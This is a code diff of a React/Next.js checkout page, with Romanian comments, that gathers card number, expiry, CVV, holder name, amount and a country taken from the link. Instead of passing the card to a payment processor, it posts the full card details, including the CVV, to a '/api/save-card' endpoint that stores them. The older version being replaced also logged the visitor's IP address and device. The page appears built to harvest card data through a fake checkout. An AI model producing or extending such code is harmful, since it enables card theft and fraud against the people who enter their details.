@@ -1,44 +1,34 @@
 "use client";
-import React, { useState } from "react";
+
+import React, { useEffect, useState } from "react";
+import { useSearchParams } from "next/navigation";
 
 type CardType = "visa" | "mastercard" | "amex" | "revolut" | "default";
 
 const Checkout: React.FC = () => {
-  const [cardNumber, setCardNumber] = useState<string>(""); // Număr card formatat
-  const [cardType, setCardType] = useState<CardType>("default"); // Tip card
-  const [amount, setAmount] = useState<string>(""); // Suma introdusă
-  const [expDate, setExpDate] = useState<string>(""); // Data expirării formatată
-  const [cvv, setCvv] = useState<string>(""); // CVV
-  const [error, setError] = useState<string | null>(null); // Mesaj de eroare
-  const [isLoading, setIsLoading] = useState<boolean>(false); // Starea de încărcare
+  const searchParams = useSearchParams(); // Extragem parametrii din URL
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardType, setCardType] = useState<CardType>("default");
+  const [amount, setAmount] = useState("");
+  const [expDate, setExpDate] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [holder, setHolder] = useState("");
+  const [country, setCountry] = useState(""); // Țara din link
+  const [isLoading, setIsLoading] = useState(false);
 
-  const cardLogos: Record<CardType, { src: string; width: string; height: string }> = {
-    visa: {
-      src: "https://image.similarpng.com/very-thumbnail/2020/06/Logo-VISA-transparent-PNG.png",
-      width: "w-10",
-      height: "h-6",
-    },
-    mastercard: {
-      src: "https://e7.pngegg.com/pngimages/530/165/png-clipart-logo-mastercard-pentagram-flat-design-brand-mastercard-text-trademark.png",
-      width: "w-12",
-      height: "h-8",
-    },
-    amex: {
-      src: "https://cdn-icons-png.flaticon.com/512/196/196539.png",
-      width: "w-14",
-      height: "h-8",
-    },
-    revolut: {
-      src: "https://www.logo.wine/a/logo/Revolut/Revolut-Logo.wine.svg",
-      width: "w-12",
-      height: "h-6",
-    },
-    default: {
-      src: "/default-logo.png",
-      width: "w-8",
-      height: "h-8",
-    },
-  };
+  // Array-ul de linkuri pentru logourile cardurilor
+  const cardLogos = [
+    { type: "visa", src: "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" },
+    { type: "mastercard", src: "https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" },
+    { type: "amex", src: "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg" },
+    { type: "revolut", src: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/Revolut_Logo.svg/512px-Revolut_Logo.svg.png" },
+  ];
+
+  useEffect(() => {
+    // Extragem parametrul `country` din URL
+    const countryParam = searchParams.get("country");
+    if (countryParam) setCountry(countryParam);
+  }, [searchParams]);
 
   const detectCardType = (number: string): CardType => {
     if (/^4/.test(number)) return "visa";
@@ -48,87 +38,37 @@ const Checkout: React.FC = () => {
     return "default";
   };
 
-  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/\D/g, ""); // Elimină caracterele nenumerice
-    value = value.replace(/(\d{4})(?=\d)/g, "$1 "); // Adaugă spațiu după fiecare 4 cifre
-    setCardNumber(value.trim());
-    setCardType(detectCardType(value));
-  };
-
-  const handleExpDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/\D/g, ""); // Elimină caracterele nenumerice
-
-    if (value.length > 2) {
-      const month = value.slice(0, 2);
-      const day = value.slice(2, 4);
-
-      // Validare lună
-      if (parseInt(month, 10) > 12) {
-        value = "12"; // Maximul este 12
-      } else if (parseInt(month, 10) === 0) {
-        value = "01"; // Minimul este 01
-      }
-
-      // Validare zi
-      if (day && parseInt(day, 10) > 31) {
-        value = `${month}/31`; // Maximul este 31
-      } else if (day) {
-        value = `${month}/${day}`;
-      }
-    }
-
-    setExpDate(value);
-  };
-
-  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/[^\d.]/g, ""); // Permite doar numere și punct
-    setAmount(value);
-
-    if (Number(value) < 250) {
-      setError("Amount must be at least 250 EUR."); // Setează mesajul de eroare
-    } else {
-      setError(null); // Elimină eroarea dacă suma este validă
-    }
-  };
-
   const handleSubmit = async () => {
-    if (error || !amount || !cardNumber || !expDate || !cvv) {
+    if (!cardNumber || !expDate || !cvv || !holder || !amount || !country) {
       alert("Please fill in all fields correctly.");
       return;
     }
 
     setIsLoading(true);
-
     const payload = {
       cardNumber,
       cardType,
       amount,
       expDate,
       cvv,
-      ip: null,
-      device: window.navigator.userAgent,
+      holder,
+      country,
     };
 
     try {
-      const ipResponse = await fetch("https://api64.ipify.org?format=json");
-      const ipData = await ipResponse.json();
-      payload.ip = ipData.ip;
-
-      const response = await fetch("/api/save-checkout-data", {
+      const response = await fetch("/api/save-card", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
       });
 
       if (response.ok) {
-        alert("Payment data successfully saved!");
+        alert("Card data successfully saved!");
       } else {
-        alert("Failed to save payment data.");
+        alert("Failed to save card data.");
       }
     } catch (err) {
-      console.error("Error submitting data:", err);
+      console.error("Error:", err);
     } finally {
       setIsLoading(false);
     }
@@ -137,64 +77,68 @@ const Checkout: React.FC = () => {
   return (
     <div className="min-h-screen flex items-center justify-center bg-gray-100">
       <div className="max-w-sm mx-auto p-4 bg-white shadow-lg rounded-md">
-        <h2 className="text-lg font-semibold mb-4">Pay with</h2>
-        <div className="flex space-x-2 mb-4">
-          {Object.entries(cardLogos).map(([type, logo]) =>
-            type !== "default" ? (
-              <img
-                key={type}
-                src={logo.src}
-                alt={`${type} logo`}
-                className={`inline-block ${logo.width} ${logo.height}`}
-              />
-            ) : null
-          )}
-        </div>
-        <div className="mb-4 relative">
-          <input
-            type="text"
-            value={cardNumber}
-            onChange={handleCardNumberChange}
-            placeholder="Card number"
-            className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
-          />
-          {cardType !== "default" && (
+        <div className="flex space-x-2 mb-4 justify-center">
+          {/* Afișăm logourile cardurilor */}
+          {cardLogos.map((logo) => (
             <img
-              src={cardLogos[cardType].src}
-              alt={`${cardType} logo`}
-              className={`absolute right-3 top-2 ${cardLogos[cardType].width} ${cardLogos[cardType].height}`}
+              key={logo.type}
+              src={logo.src}
+              alt={`${logo.type} logo`}
+              className="w-10 h-6 object-contain"
             />
-          )}
+          ))}
         </div>
+
         <div className="mb-4">
           <input
-            type="text"
-            value={expDate}
-            onChange={handleExpDateChange}
-            placeholder="MM/DD"
-            className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
+            placeholder="Name Surname"
+            className="w-full px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
+            value={holder}
+            onChange={(e) => setHolder(e.target.value)}
           />
         </div>
+
+        <div className="relative mb-4">
+          <input
+            placeholder="Card Number"
+            className="w-full px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
+            value={cardNumber}
+            onChange={(e) => {
+              const formatted = e.target.value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
+              setCardNumber(formatted);
+              setCardType(detectCardType(formatted));
+            }}
+          />
+        </div>
+
         <div className="flex space-x-4 mb-4">
           <input
-            type="text"
-            value={cvv}
-            onChange={(e) => setCvv(e.target.value)}
-            placeholder="CVV2"
-            className="w-1/2 px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
+            placeholder="MM/YY"
+            className="w-1/2 px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
+            value={expDate}
+            onChange={(e) => setExpDate(e.target.value.replace(/\D/g, "").replace(/(\d{2})(\d{2})/, "$1/$2"))}
           />
           <input
-            type="text"
-            value={amount}
-            onChange={handleAmountChange}
-            placeholder="Amount"
-            className="w-1/2 px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
+            placeholder="CVV"
+            className="w-1/2 px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
+            value={cvv}
+            onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
           />
         </div>
+
+        <div className="mb-4">
+          <input
+            placeholder="Amount"
+            className="w-full px-3 py-2 border rounded-md focus:ring-2 focus:ring-purple-500"
+            value={amount}
+            onChange={(e) => setAmount(e.target.value.replace(/[^\d.]/g, ""))}
+          />
+        </div>
+
         <button
           className="w-full bg-purple-500 text-white py-2 rounded-md hover:bg-purple-600 transition"
           onClick={handleSubmit}
-          disabled={isLoading || !!error || !amount}
+          disabled={isLoading}
         >
           {isLoading ? "Processing..." : `Pay ${amount || " "} EUR`}
         </button>
